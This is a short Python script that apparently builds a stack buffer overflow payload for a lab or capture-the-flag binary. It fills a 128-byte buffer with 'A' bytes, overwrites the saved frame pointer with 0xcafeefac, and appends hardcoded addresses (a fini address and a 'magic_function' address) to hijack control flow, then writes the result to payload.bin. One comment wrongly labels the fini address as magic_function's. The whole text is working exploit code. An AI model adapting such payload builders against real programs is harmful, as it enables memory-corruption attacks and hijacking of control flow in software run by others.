
buffer_size = 128
saved_frame_pointer = 4
value = 0xcafeefac
fini = 0x080494e8
address_magic_function = 0x08049388


# Create payload
#payload = value.to_bytes(4, 'little')  # Value to be written in saved frame pointer
payload = b'A' * buffer_size  # Fill the buffer
payload += value.to_bytes(4, 'little')  # Value to be written in saved frame pointer
payload += fini.to_bytes(4, 'little')  # Address of magic_function
payload += address_magic_function.to_bytes(4, 'little')  # Address of magic_function



# Write length of payload and payload to a file
with open('payload.bin', 'wb') as f:
    f.write(payload)